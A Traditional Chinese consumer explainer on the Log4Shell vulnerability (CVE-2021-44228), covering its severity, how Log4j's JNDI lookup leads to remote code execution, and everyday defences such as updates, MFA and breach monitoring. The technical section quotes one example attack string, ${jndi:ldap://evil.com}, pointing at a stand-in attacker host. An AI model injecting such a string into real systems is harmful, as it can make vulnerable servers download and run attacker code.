Log4Shell (CVE-2021-44228)

癱瘓網際網路的漏洞。嚴重性評分 10.0 / 10。

影響數十億台設備：Minecraft、蘋果、亞馬遜和特斯拉。


🔥 為何是「10 分滿分」？

它需要零身份驗證。它需要零特殊技能。駭客只需在聊天框或登入畫面中輸入特定的文字字串，即可控制伺服器。

♾️ 「地方性流行病」

由於易受攻擊的程式碼 (Log4j) 隱藏在數千個其他程式中，專家表示此漏洞將持續存在十年以上。它很難找到也很難修復。

技術剖析

1. Log4j 是什麼？

它不是一個應用程式；它是一個「日誌記錄函式庫」。它記錄事件（如「使用者 X 已登入」）。它被用於數百萬個 Java 應用程式中。

2. JNDI 功能

Log4j 有一個功能，如果它記錄一個特定的文字字串，如 ${jndi:ldap://evil.com}，它實際上會前往該網站並下載程式碼。

3. 遠端程式碼執行 (RCE)

透過強迫伺服器從駭客的網站下載程式碼，駭客可以完全控制該機器。這是駭客的「聖杯」。

消費者防禦：「鎖好你自己的門」

您無法修補亞馬遜的伺服器，但此漏洞教導我們風險會向下游擴散。以下是普通人如何保護自己免受「網際網路級別」的臭蟲侵害。

🔄

1. 更新「看不見」的設備

Log4Shell 影響智慧冰箱、路由器和遊戲機。在您擁有的每台設備上啟用自動更新。不要拖延。

🔐

2. 多重身份驗證 (MFA)

如果您使用的服務（如銀行或遊戲）透過 Log4Shell 被駭，駭客可能會竊取您的密碼。MFA 可以阻止他們使用密碼。

🗑️

3. 最小化您的「攻擊面」

刪除您不使用的應用程式。您手機或電腦上的每個舊應用程式都是像 Log4j 這樣的易受攻擊函式庫的潛在藏身之處。

🕵️

4. 監控外洩事件

由於您無法控制公司是否被駭，您必須監控自己的身份。使用像「Have I Been Pwned」或信用監控等服務來查看您的資料是否外洩。
